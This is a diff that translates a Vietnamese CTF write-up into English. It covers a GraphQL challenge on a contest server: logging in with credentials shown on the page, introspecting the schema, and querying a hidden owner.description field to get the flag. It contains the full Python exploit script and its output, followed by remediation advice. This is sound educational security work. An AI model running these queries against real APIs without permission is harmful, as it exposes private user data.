@@ -1,16 +1,15 @@
 ---
 title: '[CSSCTF] Web Exploitation: Secret Supernovas'
 date: '2026-10-02'
-description: Writeup thử thách Web "Secret Supernovas" trong CSSCTF - khai thác lỗ
-  hổng GraphQL API để đọc dữ liệu nhạy cảm.
+description: 'Write-up for the "Secret Supernovas" Web challenge in CSSCTF - exploiting GraphQL API authorization flaws (BOPLA) to extract sensitive data.'
 categories: [CSSCTF, Web]
 tags: [cssctf, web, graphql, api-security, recon]
-series: [CSSCTF 2026]
+series: ['CSSCTF 2026']
 showAuthor: false
 showTableOfContents: true
 ---
 
-# 🌟 CTF Write-up: Secret Supernovas
+# CTF Write-up: Secret Supernovas
 
 **Competition:** CSSCTF  
 **Category:** Web  
@@ -21,19 +20,19 @@ showTableOfContents: true
 
 ---
 
-## 📋 Mô tả Challenge
+## Challenge Description
 
 > This is just a list of stars. Nothing else to see here...
 
-Mô tả cố tình đơn giản để đánh lạc hướng. Thực tế đây là một web app về danh sách các ngôi sao thiên văn, ẩn chứa thông tin bí mật trong một GraphQL API không được bảo vệ đúng cách.
+The challenge statement is intentionally understated. In reality, the application serves an astronomical star catalogue backed by an inadequately secured GraphQL API that conceals confidential data.
 
 ---
 
-## 🔍 Bước 1: Trinh sát ban đầu (Reconnaissance)
+## Step 1: Reconnaissance
 
-### 1.1 Khám phá trang chủ
+### 1.1 Inspecting the Landing Page
 
-Truy cập `http://34.116.80.78:9982/` và quan sát response HTML:
+Navigating to `http://34.116.80.78:9982/` displays the login interface:
 
 ```html
 <title>Log in · Star City Observatory</title>
@@ -50,18 +49,18 @@ Truy cập `http://34.116.80.78:9982/` và quan sát response HTML:
 ```
 
 > [!NOTE]
-> Trang login **tự lộ credentials** trong phần hint: `cadet/star`. Đây là tài khoản "visitor" với quyền hạn thấp.
+> The login form explicitly reveals default visitor credentials: `cadet/star`.
 
-**Thông tin thu thập được:**
-- Ứng dụng tên: **Star City Observatory**
-- Framework: **SvelteKit** (nhận biết qua Svelte logo SVG trong favicon và cấu trúc HTML)
-- Có cơ chế login, có thể có phân quyền theo role
+**Initial observations:**
+- Application name: **Star City Observatory**
+- Framework: **SvelteKit** (identified via Svelte SVG logos and compiled client asset structure)
+- Form-based authentication with potential role segregation
 
 ---
 
-## 🔐 Bước 2: Đăng nhập và khám phá phiên đăng nhập
+## Step 2: Authentication and Session Analysis
 
-### 2.1 Đăng nhập với tài khoản `cadet/star`
+### 2.1 Authenticating as `cadet/star`
 
 ```python
 import requests
@@ -81,16 +80,16 @@ print('Body:', resp.text)
 # {"type":"redirect","status":303,"location":"/"}
 ```
 
-**Kết quả:** Server trả về JSON redirect thay vì HTTP 303 thực sự (đặc trưng của SvelteKit form actions). Cookie session được set với `HttpOnly; SameSite=Lax`.
+**Result:** The endpoint responds with JSON redirect instructions rather than an HTTP 303 status code, typical of SvelteKit form actions. A session cookie is established with `HttpOnly; SameSite=Lax`.
 
-### 2.2 Truy cập trang chính sau khi đăng nhập
+### 2.2 Accessing the Authenticated Dashboard
 
 ```python
 resp2 = session.get('http://34.116.80.78:9982/')
 print(resp2.text)
 ```
 
-HTML trả về chứa thông tin user trong SvelteKit data:
+The returned HTML includes embedded session details in the client-side bootstrap state:
 
 ```javascript
 kit.start(app, element, {
@@ -106,17 +105,17 @@ kit.start(app, element, {
 ```
 
 > [!IMPORTANT]
-> User `cadet` có **id = 10**, tên "Cadet Visitor". Đây là account dạng visitor với quyền hạn thấp nhất.
+> The user `cadet` has `id = 10` and name "Cadet Visitor", representing an unprivileged guest profile.
 
-Trang chính hiển thị `"Aligning telescope…"` — dữ liệu ngôi sao được load **asynchronously** bởi JavaScript, không phải server-side render. Điều này gợi ý có một **API endpoint riêng biệt** để fetch dữ liệu.
+The page initially displays `"Aligning telescope…"`, showing that star records are retrieved **asynchronously** via client-side JavaScript rather than rendered server-side. This points to a dedicated backend API endpoint.
 
 ---
 
-## 🕵️ Bước 3: Phân tích JavaScript Bundle
+## Step 3: JavaScript Bundle Analysis
 
-### 3.1 Xác định các file JS
+### 3.1 Inspecting Application Bundles
 
-SvelteKit cung cấp manifest các file JS trong entry point:
+The SvelteKit entry point enumerates route chunks:
 
 ```javascript
 // /_app/immutable/entry/app.JEDSD3tx.js
@@ -127,9 +126,9 @@ const __vite__mapDeps = (i, m=__vite__mapDeps, d=(m.f||(m.f=[
     "../assets/0.DXnTN1b8.css",
     "../nodes/1.CTC9N2L_.js",
     "../chunks/CU-I4PXI.js",
-    "../nodes/2.C521ycad.js",    // <-- trang chính (Stars)
+    "../nodes/2.C521ycad.js",    // <-- Main page (Stars)
     "../assets/2.Df5bwoDh.css",
-    "../nodes/3.BbGUoTEM.js",    // <-- trang login
+    "../nodes/3.BbGUoTEM.js",    // <-- Login page
     "../assets/3.DTxWb2OH.css"
 ]))) => i.map(i => d[i]);
 ```
@@ -143,9 +142,9 @@ var I = {
 };
 ```
 
-### 3.2 Phân tích node 2 — Trang Stars (quan trọng nhất!)
+### 3.2 Analyzing Node 2 — The Stars Component
 
-Tải file `/_app/immutable/nodes/2.C521ycad.js` và tìm được đoạn code critical:
+Downloading `/_app/immutable/nodes/2.C521ycad.js` reveals the data retrieval logic:
 
 ```javascript
 m(async () => {
@@ -166,15 +165,15 @@ m(async () => {
 ```
 
 > [!IMPORTANT]
-> **Phát hiện mấu chốt:** Ứng dụng sử dụng **GraphQL** tại endpoint `/graphql`. Query chỉ request một số field nhất định (`id name spectralClass magnitude classification galaxy`), nhưng server có thể có nhiều field hơn không được UI hiển thị!
+> **Key Finding:** The client sends queries to a **GraphQL** endpoint at `/graphql`. The query specifies only a partial set of fields (`id name spectralClass magnitude classification galaxy`), leaving open the possibility of unexposed schema fields.
 
 ---
 
-## 🔬 Bước 4: Khai thác GraphQL
+## Step 4: GraphQL Exploitation
 
-### 4.1 GraphQL Introspection
+### 4.1 Schema Introspection
 
-GraphQL cung cấp cơ chế **introspection** để tự mô tả schema của mình. Đây là bước đầu tiên khi tấn công một GraphQL API:
+GraphQL features an introspection system allowing clients to query schema definitions. With introspection enabled on the target, the complete schema structure can be recovered:
 
 ```python
 def gql(query):
@@ -202,7 +201,7 @@ result = gql('''
 ''')
 ```
 
-**Schema đầy đủ được khám phá:**
+**Extracted Schema:**
 
 ```
 Query type: Query
@@ -216,7 +215,7 @@ Query type: Query
 
 === TYPE: Person ===
   - date_of_birth
-  - description       <-- ⚠️ Đáng ngờ!
+  - description       <-- Suspicious
   - first_name
   - id
   - last_name
@@ -226,7 +225,7 @@ Query type: Query
   - galaxy(id: Int)
   - star(id: Int)
   - stars
-  - user(id: Int)     <-- ⚠️ Có thể query user bất kỳ!
+  - user(id: Int)     <-- Arbitrary user query possible
 
 === TYPE: Star ===
   - classification
@@ -234,16 +233,16 @@ Query type: Query
   - id
   - magnitude
   - name
-  - owner             <-- ⚠️ Field ẩn! UI không hiển thị!
+  - owner             <-- Hidden field not rendered in UI
   - spectralClass
 ```
 
 > [!WARNING]
-> **Lỗ hổng phát hiện:** Type `Star` có field **`owner`** (kiểu `Person`) KHÔNG được UI hiển thị. Field `Person.description` có thể chứa thông tin nhạy cảm. Đây là dấu hiệu của **Broken Object Property Level Authorization (BOPLA)**.
+> **Identified Flaw:** Type `Star` contains an **`owner`** field returning a `Person` object that is not queried by the frontend. The `Person.description` field may hold sensitive data. This constitutes **Broken Object Property Level Authorization (BOPLA)**.
 
-### 4.2 Khai thác field ẩn `owner.description`
+### 4.2 Querying the Hidden `owner.description` Field
 
-Xây dựng query để lấy toàn bộ thông tin bao gồm field ẩn:
+Constructing a query requesting the hidden owner properties:
 
 ```python
 result = gql('''
@@ -260,16 +259,16 @@ query Stars {
       first_name
       last_name
       date_of_birth
-      description    # Field không được hiển thị trên UI!
+      description    # Field omitted from the UI query
     }
   }
 }
 ''')
 ```
 
-### 4.3 Kết quả — Tìm thấy Flag!
+### 4.3 Result — Flag Discovered
 
-Response đầy đủ:
+Extract from the GraphQL response:
 
 ```json
 {
@@ -312,12 +311,12 @@ Response đầy đủ:
           "first_name": "Laurel",
           "last_name": "Lance",
           "date_of_birth": "1986-03-09",
-          "description": "CSSCTF{we_l000ve_grafs}"   // 🎉 FLAG!
+          "description": "CSSCTF{we_l000ve_grafs}"   // FLAG
         }
       },
       ...
       {
-        "id": 11, "name": "Secret Supernova",   // <-- Tên challenge!
+        "id": 11, "name": "Secret Supernova",
         "spectralClass": "SN Ia",
         "magnitude": -19.3,
         "classification": "supernova",
@@ -332,11 +331,11 @@ Response đầy đủ:
 ```
 
 > [!NOTE]
-> Star thứ 11 tên **"Secret Supernova"** chính là easter egg của challenge — tên của bài lab! Nó thuộc về **Oliver Queen** (Observatory Director), nhưng flag lại nằm trong description của **Laurel Lance** — owner của "Black Canary".
+> Star entry #11 is named **"Secret Supernova"**, referencing the challenge title. It is owned by Oliver Queen (Observatory Director), while the flag is embedded within the description of **Laurel Lance**, owner of "Black Canary".
 
 ---
 
-## 🏆 Flag
+## Flag
 
 ```
 CSSCTF{we_l000ve_grafs}
@@ -344,75 +343,75 @@ CSSCTF{we_l000ve_grafs}
 
 ---
 
-## 📊 Sơ đồ tấn công
+## Attack Flowchart
 
 ```
-[Trình duyệt / Script]
+[Browser / Exploit Script]
         |
         v
-[GET /]  -->  Trang Login (lộ credentials: cadet/star)
+[GET /]  -->  Login page (discloses credentials: cadet/star)
         |
         v
-[POST /login]  -->  Session cookie được cấp
+[POST /login]  -->  Session cookie issued
         |
         v
-[GET /]  -->  Trang Stars (data load async bằng JS)
+[GET /]  -->  Stars dashboard (data loaded asynchronously via JS)
         |
         v
-[Phân tích JS Bundle]
+[JavaScript Bundle Analysis]
         |
         +--> /nodes/2.C521ycad.js  -->  fetch('/graphql', ...)
         |                                       |
         v                                       v
-[GET /graphql  __schema introspection]   [Phát hiện field ẩn]
+[GET /graphql  __schema introspection]   [Hidden fields identified]
         |
         v
 [POST /graphql  stars { owner { description } }]
         |
         v
-[Flag trong description của Laurel Lance]
+[Flag retrieved from Laurel Lance description]
 CSSCTF{we_l000ve_grafs}
 ```
 
 ---
 
-## 🛡️ Phân tích lỗ hổng bảo mật
+## Vulnerability Analysis
 
-### Loại lỗ hổng: BOPLA + GraphQL Exposure
+### Vulnerability Classification: BOPLA and Schema Exposure
 
 **OWASP API3:2023 — Broken Object Property Level Authorization**
 
-| Yếu tố | Chi tiết |
-|--------|----------|
-| **Vector** | GraphQL field `owner.description` không được phân quyền |
-| **Điều kiện khai thác** | Chỉ cần đăng nhập (account `cadet` với quyền thấp nhất) |
-| **Dữ liệu bị lộ** | Thông tin nhạy cảm trong `description` của `Person` |
-| **Nguyên nhân gốc** | UI chỉ request một subset fields, nhưng server không enforce authorization ở field level |
+| Metric | Details |
+|--------|---------|
+| **Vector** | GraphQL field `owner.description` lacks property-level access enforcement |
+| **Prerequisites** | Low-privilege authenticated session (`cadet` visitor account) |
+| **Exposed Data** | Sensitive attributes within the `Person` type (`description`) |
+| **Root Cause** | Frontend requests only a safe subset of properties, but backend schema does not validate field-level permissions |
 
-### Tại sao lỗi xảy ra?
+### Root Causes
 
-1. **UI chỉ query một phần**: Frontend request `stars { id name spectralClass magnitude classification galaxy { name } }` — không có `owner`
-2. **Server không kiểm tra field-level access**: Bất kỳ authenticated user nào cũng có thể thêm `owner { description }` vào query
-3. **GraphQL Introspection bật**: Cho phép attacker biết toàn bộ schema, bao gồm các field "ẩn"
+1. **Client-side filtering assumption**: The UI only queries `stars { id name spectralClass magnitude classification galaxy { name } }`, omitting `owner`.
+2. **Missing field-level authorization**: Authenticated users can request `owner { description }` without restriction.
+3. **Active GraphQL Introspection**: Introspection enabled in production allows attackers to enumerate the complete data schema.
 
-### Cách fix đúng đắn
+### Remediation
 
 ```javascript
-// Ví dụ fix với graphql-shield (Node.js)
+// Example remediation using graphql-shield (Node.js)
 const permissions = shield({
     Query: {
         stars: isAuthenticated,
     },
     Star: {
-        owner: isAdmin,         // Chỉ admin mới xem được owner
+        owner: isAdmin,         // Restrict owner field to administrators
     },
     Person: {
-        description: isOwnerOrAdmin,  // Chỉ chính chủ hoặc admin
+        description: isOwnerOrAdmin,  // Only owner or admin can read description
         date_of_birth: isOwnerOrAdmin,
     }
 });
 
-// Hoặc disable introspection trong production:
+// Disable schema introspection in production environments:
 const server = new ApolloServer({
     introspection: process.env.NODE_ENV !== 'production',
 });
@@ -420,7 +419,7 @@ const server = new ApolloServer({
 
 ---
 
-## 🧰 Script khai thác hoàn chỉnh
+## Complete Exploit Script
 
 ```python
 #!/usr/bin/env python3
@@ -442,7 +441,7 @@ session = requests.Session()
 
 
 def login(username: str, password: str) -> bool:
-    """Đăng nhập và lưu session cookie."""
+    """Log in and store session cookie."""
     resp = session.post(
         f'{TARGET}/login',
         data={'username': username, 'password': password},
@@ -452,7 +451,7 @@ def login(username: str, password: str) -> bool:
 
 
 def gql(query: str) -> dict:
-    """Gửi GraphQL query."""
+    """Send GraphQL query."""
     r = session.post(
         f'{TARGET}/graphql',
         headers={'content-type': 'application/json'},
@@ -462,7 +461,7 @@ def gql(query: str) -> dict:
 
 
 def get_schema() -> None:
-    """Introspect GraphQL schema để tìm field ẩn."""
+    """Introspect GraphQL schema to discover hidden fields."""
     result = gql('''
     {
       __schema {
@@ -486,7 +485,7 @@ def get_schema() -> None:
 
 
 def find_flag() -> str:
-    """Khai thác field owner.description để tìm flag."""
+    """Exploit the owner.description field to retrieve the flag."""
     result = gql('''
     query Stars {
       stars {
@@ -525,7 +524,7 @@ def main():
 
     if flag:
         print(f"\n{'='*50}")
-        print(f"🏆 FLAG: {flag}")
+        print(f"FLAG: {flag}")
         print(f"{'='*50}")
     else:
         print("[-] Flag not found")
@@ -535,7 +534,7 @@ if __name__ == '__main__':
     main()
 ```
 
-**Output khi chạy:**
+**Execution Output:**
 
 ```
 [*] Step 1: Login with leaked credentials cadet/star
@@ -577,21 +576,16 @@ Type: Star
 [+] Flag found in star 'Black Canary' owned by Laurel Lance!
 
 ==================================================
-🏆 FLAG: CSSCTF{we_l000ve_grafs}
+FLAG: CSSCTF{we_l000ve_grafs}
 ==================================================
 ```
 
 ---
 
-## 📚 Bài học rút ra
+## Key Takeaways
 
-1. **Không bao giờ tin tưởng vào UI để che giấu dữ liệu**: Nếu dữ liệu tồn tại trong database và API có thể truy xuất được, nó không được coi là "ẩn".
-
-2. **GraphQL introspection nên tắt trong production**: Nó tiết lộ toàn bộ schema, giúp attacker biết chính xác cần query field nào.
-
-3. **Field-level authorization là bắt buộc**: Không chỉ protect query/mutation, mà cần protect từng field trong từng type.
-
-4. **Credentials trong source code/UI là cực kỳ nguy hiểm**: Dù là "test account", việc lộ `cadet/star` cho phép kẻ tấn công có điểm xuất phát để khám phá.
-
-5. **Phân tích JS bundle là kỹ thuật quan trọng**: Modern SPA thường chứa API endpoints, logic business trong bundle — attacker luôn đọc JS trước khi tấn công.
-
+1. **Never rely on frontend filtering for sensitive data isolation**: Any data exposed by GraphQL types can be queried regardless of whether UI views render it.
+2. **Disable GraphQL introspection in production**: Open introspection reveals the schema architecture and assists attackers in locating unexposed fields.
+3. **Implement property-level authorization**: Secure individual schema fields and nested types, not merely top-level operations.
+4. **Eliminate exposed credentials from client code and markup**: Even low-privilege demo accounts provide an initial foothold for authorized API exploration.
+5. **Analyze client JavaScript bundles during assessments**: Single-page application bundles often disclose unpublished API paths and operational logic.
